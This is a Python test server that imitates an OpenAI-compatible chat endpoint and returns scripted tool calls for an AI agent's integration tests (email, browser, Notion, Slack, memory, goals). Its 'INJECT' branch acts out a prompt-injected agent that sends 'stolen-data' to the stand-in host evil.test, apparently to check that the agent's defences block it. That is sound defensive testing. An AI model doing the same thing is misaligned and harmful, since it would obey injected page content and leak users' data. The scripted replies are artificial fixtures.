"""Scripted OpenAI-compatible server for integration tests.

Behaviour is chosen from the latest user goal text:
 - planner calls (system prompt contains 'planning module') -> fixed JSON plan
 - 'SEND' goal  -> calls gmail_send, then final answer
 - 'BROWSE' goal -> browser_navigate to TEST_PAGE, click the Submit button, final
 - 'INJECT' goal -> browser_navigate to injection page, then try gmail_send to attacker
 - 'REMEMBER' goal -> memory_remember then final
 - 'SCHEDULE' goal -> schedule_create then final
 - otherwise -> plain answer
"""
import json
import os
import re
import uuid

from fastapi import FastAPI, Request

app = FastAPI()
PAGE = os.environ.get("TEST_PAGE", "http://example.com/")
CALLS = []


def tc(name, args):
    return {"id": "call_" + uuid.uuid4().hex[:8], "type": "function", "function": {"name": name, "arguments": json.dumps(args)}}


def reply(content="", calls=None):
    msg = {"role": "assistant", "content": content}
    if calls:
        msg["tool_calls"] = calls
    return {"choices": [{"message": msg, "finish_reason": "tool_calls" if calls else "stop"}],
            "usage": {"prompt_tokens": 10, "completion_tokens": 5}}


@app.get("/v1/models")
def models():
    return {"data": [{"id": "fake"}]}


@app.post("/v1/chat/completions")
async def chat(req: Request):
    b = await req.json()
    CALLS.append(b)
    if b.get("model") == "missing-model":
        from fastapi.responses import JSONResponse
        return JSONResponse({"error": {"message": "model 'missing-model' not found"}}, status_code=404)
    msgs = b["messages"]
    sys = msgs[0]["content"] if msgs and msgs[0]["role"] == "system" else ""
    if "planning module" in sys and "inbox this week" in msgs[-1]["content"]:
        return reply(json.dumps({"objective": "Triage this week's inbox and prepare replies", "steps": [
            {"id": "s1", "description": "Search the inbox for important emails from the last 7 days", "tool_hint": "gmail", "risk": "read"},
            {"id": "s2", "description": "Read the threads that are waiting for a reply", "tool_hint": "gmail", "risk": "read"},
            {"id": "s3", "description": "Check the Q4 plan in Notion for context", "tool_hint": "notion", "risk": "read"},
            {"id": "s4", "description": "Draft replies and summarize what needs your decision", "tool_hint": "gmail", "risk": "write"}]}))
    if "planning module" in sys and "Q4 plan summary" in msgs[-1]["content"]:
        return reply(json.dumps({"objective": "Share the Q4 plan with the team on Slack", "steps": [
            {"id": "s1", "description": "Read the Q4 plan page in Notion", "tool_hint": "notion", "risk": "read"},
            {"id": "s2", "description": "Post a short summary to #general (needs approval)", "tool_hint": "slack", "risk": "send"}]}))
    if "planning module" in sys:
        return reply('```json\n{"objective": "test objective", "steps": [{"id":"s1","description":"do the thing","tool_hint":"x","risk":"read"}, {"id":"s2","description":"report","tool_hint":"x","risk":"read"}]}\n```')
    if msgs and "Extract durable facts" in msgs[-1]["content"]:
        return reply('{"facts": [{"fact": "Lucas prefers direct flights.", "category": "preference", "entity": ""}]}')
    users = [m["content"] for m in msgs if m["role"] == "user" and not str(m["content"]).startswith("（系统）")]
    goal = users[-1] if users else ""
    tools_done = [m for m in msgs if m["role"] == "tool"]
    n = len(tools_done)
    last_tool = tools_done[-1]["content"] if tools_done else ""
    if "LOOPFEED" in goal:   # a model stuck re-opening the same RSS feed (the 2026-09-28 news-brief run)
        if not b.get("tools"):
            return reply(f"LOOP SUMMARY after {n} tool calls: feed read, email not sent.")
        return reply("", [tc("browser_navigate", {"url": PAGE.rsplit('/', 1)[0] + "/feed.xml"})])
    if "SEND" in goal:
        if n == 0:
            return reply("I'll send it.", [tc("gmail_send", {"to": "john@example.com", "subject": "Tuesday", "body": "Tuesday 3pm works."})])
        return reply(f"Done. Result: {last_tool[:200]}")
    if "BROWSE" in goal:
        if n == 0:
            return reply("", [tc("browser_navigate", {"url": PAGE})])
        if n == 1:
            m = re.search(r"\[(e\d+)\] button \\\"Submit order", last_tool) or re.search(r"\[(e\d+)\] button", last_tool)
            return reply("", [tc("browser_click", {"ref": m.group(1) if m else "e1"})])
        return reply(f"Browsed. Last: {last_tool[:300]}")
    if "TYPEPW" in goal:
        if n == 0:
            return reply("", [tc("browser_navigate", {"url": PAGE})])
        if n == 1:
            m = re.search(r"\[(e\d+)\] textbox \\\"Password", last_tool)
            return reply("", [tc("browser_type", {"ref": m.group(1) if m else "e1", "text": "hunter2"})])
        return reply(f"Typed. {last_tool[:300]}")
    if "TAKEOVER" in goal:
        if n == 0:
            return reply("", [tc("browser_request_takeover", {"reason": "please log in"})])
        return reply(f"After takeover: {last_tool[:200]}")
    if "INJECT" in goal:
        if n == 0:
            return reply("", [tc("browser_navigate", {"url": PAGE.replace("page.html", "inject.html")})])
        if n == 1:
            return reply("", [tc("browser_navigate", {"url": "http://evil.test:8099/page.html?d=stolen-data"})])
        return reply(f"Done: {last_tool[:300]}")
    if "REMEMBER" in goal:
        if n == 0:
            return reply("", [tc("memory_remember", {"fact": "Lucas likes quiet hotels", "category": "preference"})])
        return reply("好的，我记住了。")
    if "SCHEDULE" in goal:
        if n == 0:
            return reply("", [tc("schedule_create", {"name": "daily brief", "goal": "summarize email", "kind": "cron", "spec": "0 8 * * *"})])
        return reply(f"Created: {last_tool}")
    if "MDTABLE" in goal:
        return reply("我查看了最近 7 天的收件箱，下面是需要你关注的内容：\n\n## 📬 本周邮件概况\n\n| # | 发件人 | 主题 | 建议 |\n|---|---|---|---|\n"
                     "| 1 | John Smith <john.smith@verylongcompanyname-example.com> | Q3 partnership proposal and revised pricing sheet | 需要回复 |\n"
                     "| 2 | GitHub | [beclab/apps] PR #3688 merged: Junior Investor update | 无需回复 |\n"
                     "| 3 | Bluehost | More server locations now available | 可退订 |\n\n"
                     "### 结论\n\n- ✅ **无需回复**：大多数是自动通知\n- ⚠️ **需要处理**：John 的合作提案，建议周二前回复\n\n"
                     "```\ndeploy:shadow-trader-combination-2.3h:nav failed at step verify_data_consistency_check_with_a_very_long_identifier\n```\n\n"
                     "参考链接：https://example.com/a/very/long/path/that/keeps/going/and/going/without/any/spaces/at/all/for/testing")
    if "inbox this week" in goal:
        if n == 0:
            return reply("", [tc("notion_search", {"query": "plan"})])
        if n == 1:
            return reply("", [tc("notion_get_page", {"page_id": "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee"})])
        return reply("I went through **42 emails** from the last 7 days. Three need you:\n\n"
                     "| # | From | Subject | Suggested action |\n|---|---|---|---|\n"
                     "| 1 | John Smith (Acme) | Contract terms — final version | Reply: confirm Tuesday 3pm call |\n"
                     "| 2 | Maria Chen | Q4 launch budget | Reply: approve, ask for the timeline |\n"
                     "| 3 | Stripe | Payout on hold — action needed | Update bank details in the dashboard |\n\n"
                     "### Drafts ready\n- ✉️ **Reply to John** — saved as a Gmail draft, sending needs your approval\n"
                     "- ✉️ **Reply to Maria** — saved as a draft, references the Q4 plan in Notion (launch in October)\n\n"
                     "### Nothing to do\n- 31 newsletters and notifications — 12 of them can be unsubscribed in one click\n\n"
                     "Want me to send both replies now? I'll ask Sentinel for approval first.")
    if "Q4 plan summary" in goal:
        if n == 0:
            return reply("", [tc("notion_get_page", {"page_id": "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee"})])
        if n == 1:
            return reply("", [tc("slack_send_message", {"channel": "#general", "text": "📌 *Q4 plan* — we ship Locius 0.2 in October. Goals: 1) launch on Olares Market 2) 100 beta users 3) Notion & Slack integrations. Full plan in Notion."})])
        return reply("Posted to #general ✓")
    if "Get John to confirm" in goal and "GOAL" not in goal and "goal_update" in json.dumps(b.get("tools") or []):
        if n == 0:
            return reply("", [tc("goal_update", {"status": "active", "progress": "John opened the email but hasn't replied yet. Drafted a polite follow-up for tomorrow 9:00 (sending needs your approval)."})])
        return reply("Progress recorded.")
    if "TRIGGERTEST" in goal:
        if "UNTRUSTED" not in goal or "<untrusted_content" not in goal:
            return reply("TRIGGER_NO_EVENTS")
        return reply("Trigger handled: " + goal.split("<untrusted_content", 1)[1][:300])
    if "GOALACHIEVE" in goal:
        if n == 0:
            return reply("", [tc("goal_update", {"status": "achieved", "progress": "John confirmed the contract."})])
        return reply("Goal achieved: " + last_tool[:100])
    if "GOALSILENT" in goal:
        return reply("Checked, nothing new yet.")
    if "GOALCREATE" in goal:
        if n == 0:
            return reply("", [tc("goal_create", {"title": "Contract GOALACHIEVE", "objective": "Get John to confirm the contract",
                                                 "success_criteria": "John replies yes", "check_kind": "interval", "check_spec": "60",
                                                 "deadline": "2030-01-01"})])
        return reply("Created: " + last_tool[:200])
    if "SLACKNOTION" in goal:
        if n == 0:
            return reply("", [tc("notion_get_page", {"page_id": "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee"})])
        if n == 1:
            return reply("", [tc("slack_send_message", {"channel": "#general", "text": "Q4 plan: Ship Locius 0.2"})])
        return reply("Posted: " + last_tool[:200])
    if "MCPNOTES" in goal:
        names = [t["function"]["name"] for t in b.get("tools") or []]
        if n == 0:
            if "mcp_notes__notes_search" not in names:
                return reply("NO_MCP_TOOL " + ",".join(x for x in names if x.startswith("mcp_")))
            return reply("", [tc("mcp_notes__notes_search", {"query": "q3"})])
        if n == 1:
            return reply("", [tc("mcp_notes__notes_create", {"title": "Summary", "text": "Q3: " + last_tool[-80:]})])
        return reply("MCP done: " + last_tool[:200])
    if "XMLTOOL" in goal:
        if n == 0:
            return reply('<tool_call>{"name": "files_write", "arguments": {"path": "notes/a.md", "content": "hello"}}</tool_call>')
        return reply("<think>hidden</think>Wrote file: " + last_tool)
    return reply("<think>reasoning here</think>你好！这是一个普通回答。")


@app.get("/calls")
def calls():
    return {"n": len(CALLS), "last": CALLS[-1] if CALLS else None}
